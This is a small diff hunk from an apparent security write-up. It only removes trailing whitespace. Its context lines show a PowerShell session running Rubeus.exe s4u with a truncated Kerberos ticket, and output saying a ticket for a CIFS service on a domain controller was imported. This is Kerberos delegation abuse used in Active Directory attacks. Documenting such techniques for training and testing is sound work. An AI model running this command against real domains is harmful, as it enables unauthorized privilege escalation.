@@ -195,7 +195,7 @@ PS Z:\> .\Rubeus.exe s4u /ticket:doIFfjCCBXqgAwIBBaEDAgEWooIElTCCBJF[...]mJ0Z3Qb
 [*] base64(ticket.kirbi) for SPN 'CIFS/dc03.offsec.nl':
 
       doIFfjCCBXqgAwIBBaEDAgEWooIElTCCBJF[...]mJ0Z3QbC3Byb2QuYmFtLm5s
-      
+
 [+] Ticket successfully imported!
 ```
 
